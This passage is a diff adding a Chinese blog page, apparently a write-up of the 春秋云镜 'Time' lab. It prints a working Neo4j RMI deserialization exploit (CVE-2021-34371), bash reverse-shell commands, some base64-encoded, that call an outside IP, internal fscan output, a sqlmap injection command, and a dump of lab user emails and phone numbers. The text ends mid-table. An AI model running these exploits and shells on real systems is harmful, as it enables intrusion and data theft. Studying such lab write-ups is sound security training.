@@ -1,0 +1,1078 @@
+<!DOCTYPE html>
+<html lang="zh" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>春秋云镜-Time-Writeup | Xrntkk&#39;s Blog</title>
+<meta name="keywords" content="writeup, 渗透, 春秋云镜">
+<meta name="description" content="靶标介绍：
+Time是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。">
+<meta name="author" content="Xrntkk">
+<link rel="canonical" href="http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-time-writeup/">
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  <meta name="referrer" content="no-referrer-when-downgrade">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.db3874ad7714b044ca574a35a48fc9a38e491dfc56e271a0c1a44fda4c8c0b3d.css" integrity="sha256-2zh0rXcUsETKV0o1pI/Jo45JHfxW4nGgwaRP2kyMCz0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="zh" href="http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-time-writeup/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+<meta name="baidu-site-verification" content="codeva-snmPZ4WZk8" /><meta property="og:url" content="http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-time-writeup/">
+  <meta property="og:site_name" content="Xrntkk&#39;s Blog">
+  <meta property="og:title" content="春秋云镜-Time-Writeup">
+  <meta property="og:description" content="靶标介绍：
+Time是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。">
+  <meta property="og:locale" content="zh">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2025-04-08T11:02:55+08:00">
+    <meta property="article:modified_time" content="2025-04-08T11:02:55+08:00">
+    <meta property="article:tag" content="Writeup">
+    <meta property="article:tag" content="渗透">
+    <meta property="article:tag" content="春秋云镜">
+      <meta property="og:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
+<meta name="twitter:title" content="春秋云镜-Time-Writeup">
+<meta name="twitter:description" content="靶标介绍：
+Time是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "http://localhost:1313/post/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "春秋云镜-Time-Writeup",
+      "item": "http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-time-writeup/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "春秋云镜-Time-Writeup",
+  "name": "春秋云镜-Time-Writeup",
+  "description": "靶标介绍：\nTime是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。\n",
+  "keywords": [
+    "writeup", "渗透", "春秋云镜"
+  ],
+  "articleBody": "靶标介绍：\nTime是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。\nFLAG1 fscan扫一下\n看到7474，neo4j网页端的默认端口\n登陆默认密码为neo4j/neo4j，登入后可以修改密码\n修改为neo4j/abc123456\n数据版本为3.4.18，打 CVE-2021-34371\nNeo4j 3.4.18 - RMI based Remote Code Execution (RCE) - Java remote Exploit\nexp\n1# Exploit Title: Neo4j 3.4.18 - RMI based Remote Code Execution (RCE) 2# Date: 7/30/21 3# Exploit Author: Christopher Ellis, Nick Gonella, Workday Inc. 4# Vendor Homepage: neo4j.com 5# Software Link: https://neo4j.com/download-thanks/?edition=community\u0026release=3.4.18\u0026flavour=unix 6# Version: 3.4.18 7# Tested on: Windows, Mac 8 9In older versions of Neo4j, when the shell server is enabled, RCE can be obtained via a Java deserialization exploit. In the ShellServer interface, a method setSessionVariable(Serializable paramSerializable, String paramString, Object paramObject) exists. Neo4j also has a dependency (rhino 1.7.9) with known RCE gadget chains. By crafting an object to abuse these gadget chains, one obtain RCE via the shell server. 10 11To create this from scratch using Java, you’ll need to modify the ysoserial library to include the payload found here https://github.com/mozilla/rhino/issues/520 (an update of the existing rhino gadget) as well as modify the ysoserial POM file to include the correct version of rhino. Rebuild ysoserial and include it on your exploit’s classpath. From there, you can use the ShellServer interface and associated code found in neo4j-shell-3.4.18.jar to make your client aware of the server’s method stubs. Now you should be able to call the setSessionVariable method from your exploit/client via RMI. 12In your exploit, use ysoserial to generate a payload as follows: Object payload = new RhinoGadget().getObject(COMMAND), and then call the setSessionVariable with the payload in the paramObject parameter. The other two parameters can be anything. This will cause the server to deserialize your payload, triggering the gadget chain, and running your command. 13It is worth noting that we chose to exploit this method and the paramObject parameter as this was the most direct, any method that takes in an Object (other than String or a primitave) is likely vulnerable as well. 14 15package runnable; 16 17import payloads.RhinoGadget; 18import sun.rmi.registry.RegistryImpl_Stub; 19 20import java.io.Serializable; 21import java.rmi.Naming; 22import org.neo4j.shell.ShellServer; 23 24public class ExploitB { 25 26 public static String COMMAND = \"bash -i \u003e\u0026 /dev/tcp/113.45.175.138/9001 0\u003e\u00261\"; 27 public static String TARGET = \"rmi://39.99.229.213:1337\"; 28 public static String TARGET_BINDING = \"shell\"; 29 30 public static void main (String args[]) throws Exception { 31 32 boolean validBinding = checkBinding(TARGET_BINDING, TARGET); 33 if (!validBinding) 34 { 35 System.out.println(\"[-] No valid binding found, shell server may not be listening. Exiting\"); 36 System.exit(0); 37 } 38 39 System.out.println(\"[+] Found valid binding, proceeding to exploit\"); 40 ShellServer server = (ShellServer) Naming.lookup(TARGET + \"/\" + TARGET_BINDING); 41 42 Object payload = new RhinoGadget().getObject(COMMAND); 43 44 //Here server.shutdown may also be callable without auth, just in case the exploit fails and you just want to turn the thing off 45 try { 46 server.setSessionVariable(newClientId(), \"anything_here\", payload); 47 } 48 catch (Exception UnmarshalException ) { 49 System.out.println(\"[+] Caught an unmarshalled exception, this is expected.\"); 50 } 51 System.out.println(\"[+] Exploit completed\"); 52 53 } 54 55 /** 56 * Just a helper method to validate that the rmi binding we're looking for is present 57 * @param bindingToCheck the binding you'd like to check for 58 * @param targetToCheck the rmi registry to check against 59 * @return true if the binding is present, false if not 60 */ 61 public static boolean checkBinding(String bindingToCheck, String targetToCheck) { 62 63 System.out.println(\"Trying to enumerate server bindings: \"); 64 try { 65 RegistryImpl_Stub stub = (RegistryImpl_Stub) Naming.lookup(targetToCheck); 66 67 for (String element : stub.list()) { 68 System.out.println(\"Found binding: \" + element); 69 if (element.equalsIgnoreCase(bindingToCheck)) 70 return true; 71 } 72 return false; 73 } 74 catch (Exception ex) 75 { 76 return false; 77 } 78 79 } 80 81 public static Serializable newClientId() { 82 return Integer.valueOf(1); 83 } 84 85} 86 或者直接用\nzwjjustdoit/CVE-2021-34371.jar: CVE-2021-34371.jar\n反弹shell\njava -jar rhino_gadget.jar rmi://39.99.229.213:1337 \"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTMuNDUuMTc1LjEzOC85MDAxIDA+JjE=}|{base64,-d}|{bash,-i}\" 拿到第一个flag\nneo4j@ubuntu:/$ cat /home/neo4j/f*\rcat /home/neo4j/f*\r██████████ ██ ░░░░░██░░░ ░░ ░██ ██ ██████████ █████ ░██ ░██░░██░░██░░██ ██░░░██\r░██ ░██ ░██ ░██ ░██░███████\r░██ ░██ ░██ ░██ ░██░██░░░░ ░██ ░██ ███ ░██ ░██░░██████\r░░ ░░ ░░░ ░░ ░░ ░░░░░░ flag01: flag{cd636779-1376-41a5-a2ca-9adbee764248}\rDo you know the authentication process of Kerberos? ......This will be the key to your progress. FLAG2 先信息收集一手\n1neo4j@ubuntu:/tmp$ ip addr 21: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 3 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 4 inet 127.0.0.1/8 scope host lo 5 valid_lft forever preferred_lft forever 6 inet6 ::1/128 scope host 7 valid_lft forever preferred_lft forever 82: eth0: mtu 1500 qdisc mq state UP group default qlen 1000 9 link/ether 00:16:3e:2f:e7:ab brd ff:ff:ff:ff:ff:ff 10 inet 172.22.6.36/16 brd 172.22.255.255 scope global dynamic eth0 11 valid_lft 315356731sec preferred_lft 315356731sec 12 inet6 fe80::216:3eff:fe2f:e7ab/64 scope link 13 valid_lft forever preferred_lft forever fscan扫一下内网\nfscan -h 172.22.6.0/24 -p 1-65535 -pg -eh 172.22.6.36 1neo4j@ubuntu:/tmp$ fscan -h 172.22.6.0/24 -p 1-65535 -pg -eh 172.22.6.36 2┌──────────────────────────────────────────────┐ 3│ ___ _ │ 4│ / _ \\ ___ ___ _ __ __ _ ___| | __ │ 5│ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / │ 6│ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u003c │ 7│ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │ 8└──────────────────────────────────────────────┘ 9 Fscan Version: 2.0.0 10 11[2025-04-08 11:59:45] [INFO] 暴力破解线程数: 1 12[2025-04-08 11:59:45] [INFO] 开始信息扫描 13[2025-04-08 11:59:45] [INFO] CIDR范围: 172.22.6.0-172.22.6.255 14[2025-04-08 11:59:45] [INFO] 生成IP范围: 172.22.6.0.%!d(string=172.22.6.255) - %!s(MISSING).%!d(MISSING) 15[2025-04-08 11:59:45] [INFO] 解析CIDR 172.22.6.0/24 -\u003e IP范围 172.22.6.0-172.22.6.255 16[2025-04-08 11:59:45] [INFO] 已排除指定主机: 1 个 17[2025-04-08 11:59:45] [INFO] 最终有效主机数量: 255 18[2025-04-08 11:59:45] [INFO] 开始主机扫描 19[2025-04-08 11:59:45] [INFO] 正在尝试无监听ICMP探测... 20[2025-04-08 11:59:45] [INFO] 当前用户权限不足,无法发送ICMP包 21[2025-04-08 11:59:45] [INFO] 切换为PING方式探测... 22[2025-04-08 11:59:45] [SUCCESS] 目标 172.22.6.12 存活 (ICMP) 23[2025-04-08 11:59:48] [SUCCESS] 目标 172.22.6.25 存活 (ICMP) 24[2025-04-08 11:59:48] [SUCCESS] 目标 172.22.6.38 存活 (ICMP) 25[2025-04-08 11:59:51] [INFO] 存活主机数量: 3 26[2025-04-08 11:59:51] [INFO] 有效端口数量: 65535 27[2025-04-08 11:59:51] [SUCCESS] 端口开放 172.22.6.38:22 28[2025-04-08 11:59:51] [SUCCESS] 端口开放 172.22.6.12:53 29[2025-04-08 11:59:51] [SUCCESS] 端口开放 172.22.6.38:80 30[2025-04-08 11:59:51] [SUCCESS] 端口开放 172.22.6.12:88 31[2025-04-08 11:59:51] [SUCCESS] 服务识别 172.22.6.38:22 =\u003e [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.] 32[2025-04-08 11:59:51] [SUCCESS] 端口开放 172.22.6.12:135 33[2025-04-08 11:59:52] [SUCCESS] 端口开放 172.22.6.12:139 34[2025-04-08 11:59:52] [SUCCESS] 端口开放 172.22.6.25:139 35[2025-04-08 11:59:52] [SUCCESS] 端口开放 172.22.6.25:135 36[2025-04-08 11:59:55] [SUCCESS] 端口开放 172.22.6.12:389 37[2025-04-08 11:59:56] [SUCCESS] 端口开放 172.22.6.12:445 38[2025-04-08 11:59:56] [SUCCESS] 端口开放 172.22.6.25:445 39[2025-04-08 11:59:56] [SUCCESS] 端口开放 172.22.6.12:464 40[2025-04-08 11:59:56] [SUCCESS] 服务识别 172.22.6.12:88 =\u003e 41[2025-04-08 11:59:56] [SUCCESS] 服务识别 172.22.6.38:80 =\u003e [http] 42[2025-04-08 11:59:57] [SUCCESS] 端口开放 172.22.6.12:593 43[2025-04-08 11:59:57] [SUCCESS] 端口开放 172.22.6.12:636 44[2025-04-08 11:59:57] [SUCCESS] 服务识别 172.22.6.12:593 =\u003e [ncacn_http] 版本:1.0 产品:Microsoft Windows RPC over HTTP 系统:Windows Banner:[ncacn_http/1.0] 45[2025-04-08 11:59:57] [SUCCESS] 服务识别 172.22.6.12:636 =\u003e 46[2025-04-08 11:59:57] [SUCCESS] 服务识别 172.22.6.12:139 =\u003e Banner:[.] 47[2025-04-08 11:59:57] [SUCCESS] 服务识别 172.22.6.25:139 =\u003e Banner:[.] 48[2025-04-08 11:59:58] [SUCCESS] 端口开放 172.22.6.12:3268 49[2025-04-08 11:59:58] [SUCCESS] 端口开放 172.22.6.12:3269 50[2025-04-08 11:59:58] [SUCCESS] 服务识别 172.22.6.12:3269 =\u003e 51[2025-04-08 11:59:59] [SUCCESS] 端口开放 172.22.6.12:3389 52[2025-04-08 11:59:59] [SUCCESS] 端口开放 172.22.6.25:3389 53[2025-04-08 12:00:00] [SUCCESS] 服务识别 172.22.6.12:389 =\u003e [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name 54[2025-04-08 12:00:01] [SUCCESS] 服务识别 172.22.6.12:445 =\u003e 55[2025-04-08 12:00:01] [SUCCESS] 服务识别 172.22.6.25:445 =\u003e 56[2025-04-08 12:00:02] [SUCCESS] 服务识别 172.22.6.12:464 =\u003e 57[2025-04-08 12:00:03] [SUCCESS] 服务识别 172.22.6.12:3268 =\u003e [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name 58[2025-04-08 12:00:04] [SUCCESS] 服务识别 172.22.6.25:3389 =\u003e 59[2025-04-08 12:00:15] [SUCCESS] 端口开放 172.22.6.12:9389 60[2025-04-08 12:00:20] [SUCCESS] 服务识别 172.22.6.12:9389 =\u003e 61[2025-04-08 12:00:40] [SUCCESS] 端口开放 172.22.6.12:15774 62[2025-04-08 12:00:40] [SUCCESS] 端口开放 172.22.6.25:15774 63[2025-04-08 12:00:51] [SUCCESS] 服务识别 172.22.6.12:15774 =\u003e 64[2025-04-08 12:00:51] [SUCCESS] 服务识别 172.22.6.25:15774 =\u003e 65[2025-04-08 12:00:51] [SUCCESS] 服务识别 172.22.6.12:53 =\u003e 66[2025-04-08 12:00:57] [SUCCESS] 服务识别 172.22.6.12:135 =\u003e 67[2025-04-08 12:00:57] [SUCCESS] 服务识别 172.22.6.25:135 =\u003e 68[2025-04-08 12:01:04] [SUCCESS] 服务识别 172.22.6.12:3389 =\u003e 69[2025-04-08 12:02:16] [SUCCESS] 端口开放 172.22.6.25:47001 70[2025-04-08 12:02:16] [SUCCESS] 端口开放 172.22.6.12:47001 71[2025-04-08 12:02:21] [SUCCESS] 服务识别 172.22.6.25:47001 =\u003e [http] 72[2025-04-08 12:02:21] [SUCCESS] 服务识别 172.22.6.12:47001 =\u003e [http] 73[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.12:49664 74[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.12:49666 75[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.25:49665 76[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.12:49665 77[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.25:49664 78[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.25:49667 79[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.12:49667 80[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.25:49666 81[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.25:49668 82[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.25:49669 83[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.25:49670 84[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.12:49671 85[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.12:49674 86[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.12:49675 87[2025-04-08 12:02:22] [SUCCESS] 服务识别 172.22.6.12:49674 =\u003e [ncacn_http] 版本:1.0 产品:Microsoft Windows RPC over HTTP 系统:Windows Banner:[ncacn_http/1.0] 88[2025-04-08 12:02:23] [SUCCESS] 端口开放 172.22.6.25:49675 89[2025-04-08 12:02:23] [SUCCESS] 端口开放 172.22.6.25:49676 90[2025-04-08 12:02:23] [SUCCESS] 端口开放 172.22.6.12:49678 91[2025-04-08 12:02:23] [SUCCESS] 端口开放 172.22.6.12:49687 92[2025-04-08 12:02:23] [SUCCESS] 端口开放 172.22.6.12:49772 93[2025-04-08 12:02:34] [SUCCESS] 端口开放 172.22.6.12:54921 94[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.12:49664 =\u003e 95[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.12:49666 =\u003e 96[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.25:49665 =\u003e 97[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.12:49665 =\u003e 98[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.25:49664 =\u003e 99[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.25:49667 =\u003e 100[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.12:49667 =\u003e 101[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.25:49666 =\u003e 102[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.25:49668 =\u003e 103[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.25:49669 =\u003e 104[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.25:49670 =\u003e 105[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.12:49671 =\u003e 106[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.12:49675 =\u003e 107[2025-04-08 12:03:18] [SUCCESS] 服务识别 172.22.6.25:49675 =\u003e 108[2025-04-08 12:03:18] [SUCCESS] 服务识别 172.22.6.25:49676 =\u003e 109[2025-04-08 12:03:18] [SUCCESS] 服务识别 172.22.6.12:49678 =\u003e 110[2025-04-08 12:03:18] [SUCCESS] 服务识别 172.22.6.12:49687 =\u003e 111[2025-04-08 12:03:18] [SUCCESS] 服务识别 172.22.6.12:49772 =\u003e 112[2025-04-08 12:03:29] [SUCCESS] 服务识别 172.22.6.12:54921 =\u003e 113[2025-04-08 12:03:29] [INFO] 存活端口数量: 43 114[2025-04-08 12:03:29] [INFO] 开始漏洞扫描 115[2025-04-08 12:03:29] [INFO] 加载的插件: findnet, ldap, ms17010, netbios, rdp, smb, smb2, smbghost, ssh, webpoc, webtitle 116[2025-04-08 12:03:29] [SUCCESS] NetInfo 扫描结果 117目标主机: 172.22.6.12 118主机名: DC-PROGAME 119发现的网络接口: 120 IPv4地址: 121 └─ 172.22.6.12 122[2025-04-08 12:03:29] [SUCCESS] NetInfo 扫描结果 123目标主机: 172.22.6.25 124主机名: WIN2019 125发现的网络接口: 126 IPv4地址: 127 └─ 172.22.6.25 128[2025-04-08 12:03:29] [SUCCESS] NetBios 172.22.6.25 XIAORANG\\WIN2019 129[2025-04-08 12:03:29] [SUCCESS] 网站标题 http://172.22.6.38 状态码:200 长度:1531 标题:后台登录 130[2025-04-08 12:03:29] [INFO] 系统信息 172.22.6.12 [Windows Server 2016 Datacenter 14393] 131[2025-04-08 12:03:29] [SUCCESS] NetBios 172.22.6.12 DC:DC-PROGAME.xiaorang.lab Windows Server 2016 Datacenter 14393 扫出来三台机子\n172.22.6.12 DC-PROGAME [Windows Server 2016 Datacenter 14393]\r172.22.6.25 WIN2019\r172.22.6.38 先来看172.22.6.38\n有一个后台登录\n这里存在sql注入，用sqlmap把所有数据dump下来\nproxychains4 sqlmap -u http://172.22.6.38/index.php -data \"username=admin\u0026password=*\" --dump FLAG2\n[1 entry]\r+----+--------------------------------------------+\r| id | flag02 |\r+----+--------------------------------------------+\r| 1 | flag{b142f5ce-d9b8-4b73-9012-ad75175ba029} |\r+----+--------------------------------------------+ 用户信息\n这里只显示最后256行结果，但是sqlmap会将完整结果储存为csv\n1[12:28:43] [INFO] table 'oa_db.oa_users' dumped to CSV file '/root/.local/share/sqlmap/output/172.22.6.38/dump/oa_db/oa_users.csv' [500 entries]\r+-----+----------------------------+-------------+-----------------+\r| id | email | phone | username |\r+-----+----------------------------+-------------+-----------------+\r[12:28:43] [WARNING] console output will be trimmed to last 256 rows due to large table size\r| 245 | chenyan@xiaorang.lab | 18281528743 | CHEN YAN |\r| 246 | tanggui@xiaorang.lab | 18060615547 | TANG GUI |\r| 247 | buning@xiaorang.lab | 13046481392 | BU NING |\r| 248 | beishu@xiaorang.lab | 18268508400 | BEI SHU |\r| 249 | shushi@xiaorang.lab | 17770383196 | SHU SHI |\r| 250 | fuyi@xiaorang.lab | 18902082658 | FU YI |\r| 251 | pangcheng@xiaorang.lab | 18823789530 | PANG CHENG |\r| 252 | tonghao@xiaorang.lab | 13370873526 | TONG HAO |\r| 253 | jiaoshan@xiaorang.lab | 15375905173 | JIAO SHAN |\r| 254 | dulun@xiaorang.lab | 13352331157 | DU LUN |\r| 255 | kejuan@xiaorang.lab | 13222550481 | KE JUAN |\r| 256 | gexin@xiaorang.lab | 18181553086 | GE XIN |\r| 257 | lugu@xiaorang.lab | 18793883130 | LU GU |\r| 258 | guzaicheng@xiaorang.lab | 15309377043 | GU ZAI CHENG |\r| 259 | feicai@xiaorang.lab | 13077435367 | FEI CAI |\r| 260 | ranqun@xiaorang.lab | 18239164662 | RAN QUN |\r| 261 | zhouyi@xiaorang.lab | 13169264671 | ZHOU YI |\r| 262 | shishu@xiaorang.lab | 18592890189 | SHI SHU |\r| 263 | yanyun@xiaorang.lab | 15071085768 | YAN YUN |\r| 264 | chengqiu@xiaorang.lab | 13370162980 | CHENG QIU |\r| 265 | louyou@xiaorang.lab | 13593582379 | LOU YOU |\r| 266 | maqun@xiaorang.lab | 15235945624 | MA QUN |\r| 267 | wenbiao@xiaorang.lab | 13620643639 | WEN BIAO |\r| 268 | weishengshan@xiaorang.lab | 18670502260 | WEI SHENG SHAN |\r| 269 | zhangxin@xiaorang.lab | 15763185760 | ZHANG XIN |\r| 270 | chuyuan@xiaorang.lab | 18420545268 | CHU YUAN |\r| 271 | wenliang@xiaorang.lab | 13601678032 | WEN LIANG |\r| 272 | yulvxue@xiaorang.lab | 18304374901 | YU LV XUE |\r| 273 | luyue@xiaorang.lab | 18299785575 | LU YUE |\r| 274 | ganjian@xiaorang.lab | 18906111021 | GAN JIAN |\r| 275 | pangzhen@xiaorang.lab | 13479328562 | PANG ZHEN |\r| 276 | guohong@xiaorang.lab | 18510220597 | GUO HONG |\r| 277 | lezhong@xiaorang.lab | 15320909285 | LE ZHONG |\r| 278 | sheweiyue@xiaorang.lab | 13736399596 | SHE WEI YUE |\r| 279 | dujian@xiaorang.lab | 15058892639 | DU JIAN |\r| 280 | lidongjin@xiaorang.lab | 18447207007 | LI DONG JIN |\r| 281 | hongqun@xiaorang.lab | 15858462251 | HONG QUN |\r| 282 | yexing@xiaorang.lab | 13719043564 | YE XING |\r| 283 | maoda@xiaorang.lab | 13878840690 | MAO DA |\r| 284 | qiaomei@xiaorang.lab | 13053207462 | QIAO MEI |\r| 285 | nongzhen@xiaorang.lab | 15227699960 | NONG ZHEN |\r| 286 | dongshu@xiaorang.lab | 15695562947 | DONG SHU |\r| 287 | zhuzhu@xiaorang.lab | 13070163385 | ZHU ZHU |\r| 288 | jiyun@xiaorang.lab | 13987332999 | JI YUN |\r| 289 | qiguanrou@xiaorang.lab | 15605983582 | QI GUAN ROU |\r| 290 | yixue@xiaorang.lab | 18451603140 | YI XUE |\r| 291 | chujun@xiaorang.lab | 15854942459 | CHU JUN |\r| 292 | shenshan@xiaorang.lab | 17712052191 | SHEN SHAN |\r| 293 | lefen@xiaorang.lab | 13271196544 | LE FEN |\r| 294 | yubo@xiaorang.lab | 13462202742 | YU BO |\r| 295 | helianrui@xiaorang.lab | 15383000907 | HE LIAN RUI |\r| 296 | xuanqun@xiaorang.lab | 18843916267 | XUAN QUN |\r| 297 | shangjun@xiaorang.lab | 15162486698 | SHANG JUN |\r| 298 | huguang@xiaorang.lab | 18100586324 | HU GUANG |\r| 299 | wansifu@xiaorang.lab | 18494761349 | WAN SI FU |\r| 300 | fenghong@xiaorang.lab | 13536727314 | FENG HONG |\r| 301 | wanyan@xiaorang.lab | 17890844429 | WAN YAN |\r| 302 | diyan@xiaorang.lab | 18534028047 | DI YAN |\r| 303 | xiangyu@xiaorang.lab | 13834043047 | XIANG YU |\r| 304 | songyan@xiaorang.lab | 15282433280 | SONG YAN |\r| 305 | fandi@xiaorang.lab | 15846960039 | FAN DI |\r| 306 | xiangjuan@xiaorang.lab | 18120327434 | XIANG JUAN |\r| 307 | beirui@xiaorang.lab | 18908661803 | BEI RUI |\r| 308 | didi@xiaorang.lab | 13413041463 | DI DI |\r| 309 | zhubin@xiaorang.lab | 15909558554 | ZHU BIN |\r| 310 | lingchun@xiaorang.lab | 13022790678 | LING CHUN |\r| 311 | zhenglu@xiaorang.lab | 13248244873 | ZHENG LU |\r| 312 | xundi@xiaorang.lab | 18358493414 | XUN DI |\r| 313 | wansishun@xiaorang.lab | 18985028319 | WAN SI SHUN |\r| 314 | yezongyue@xiaorang.lab | 13866302416 | YE ZONG YUE |\r| 315 | bianmei@xiaorang.lab | 18540879992 | BIAN MEI |\r| 316 | shanshao@xiaorang.lab | 18791488918 | SHAN SHAO |\r| 317 | zhenhui@xiaorang.lab | 13736784817 | ZHEN HUI |\r| 318 | chengli@xiaorang.lab | 15913267394 | CHENG LI |\r| 319 | yufen@xiaorang.lab | 18432795588 | YU FEN |\r| 320 | jiyi@xiaorang.lab | 13574211454 | JI YI |\r| 321 | panbao@xiaorang.lab | 13675851303 | PAN BAO |\r| 322 | mennane@xiaorang.lab | 15629706208 | MEN NAN E |\r| 323 | fengsi@xiaorang.lab | 13333432577 | FENG SI |\r| 324 | mingyan@xiaorang.lab | 18296909463 | MING YAN |\r| 325 | luoyou@xiaorang.lab | 15759321415 | LUO YOU |\r| 326 | liangduanqing@xiaorang.lab | 13150744785 | LIANG DUAN QING |\r| 327 | nongyan@xiaorang.lab | 18097386975 | NONG YAN |\r| 328 | haolun@xiaorang.lab | 15152700465 | HAO LUN |\r| 329 | oulun@xiaorang.lab | 13402760696 | OU LUN |\r| 330 | weichipeng@xiaorang.lab | 18057058937 | WEI CHI PENG |\r| 331 | qidiaofang@xiaorang.lab | 18728297829 | QI DIAO FANG |\r| 332 | xuehe@xiaorang.lab | 13398862169 | XUE HE |\r| 333 | chensi@xiaorang.lab | 18030178713 | CHEN SI |\r| 334 | guihui@xiaorang.lab | 17882514129 | GUI HUI |\r| 335 | fuyue@xiaorang.lab | 18298436549 | FU YUE |\r| 336 | wangxing@xiaorang.lab | 17763645267 | WANG XING |\r| 337 | zhengxiao@xiaorang.lab | 18673968392 | ZHENG XIAO |\r| 338 | guhui@xiaorang.lab | 15166711352 | GU HUI |\r| 339 | baoai@xiaorang.lab | 15837430827 | BAO AI |\r| 340 | hangzhao@xiaorang.lab | 13235488232 | HANG ZHAO |\r| 341 | xingye@xiaorang.lab | 13367587521 | XING YE |\r| 342 | qianyi@xiaorang.lab | 18657807767 | QIAN YI |\r| 343 | xionghong@xiaorang.lab | 17725874584 | XIONG HONG |\r| 344 | zouqi@xiaorang.lab | 15300430128 | ZOU QI |\r| 345 | rongbiao@xiaorang.lab | 13034242682 | RONG BIAO |\r| 346 | gongxin@xiaorang.lab | 15595839880 | GONG 